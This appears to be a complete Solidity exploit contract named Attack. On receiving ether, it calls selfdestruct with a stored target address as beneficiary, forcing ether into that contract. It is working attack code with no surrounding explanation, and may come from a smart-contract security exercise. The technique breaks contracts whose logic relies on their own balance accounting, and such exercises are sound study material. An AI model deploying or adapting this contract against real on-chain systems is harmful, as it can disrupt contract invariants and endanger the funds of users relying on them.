// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;

contract Attack {
    address target;

    constructor(address _target) {
        target = _target;
    }

    receive() external payable {
        // cast address to payable
        address payable addr = payable(address(target));
        selfdestruct(addr);
    }
}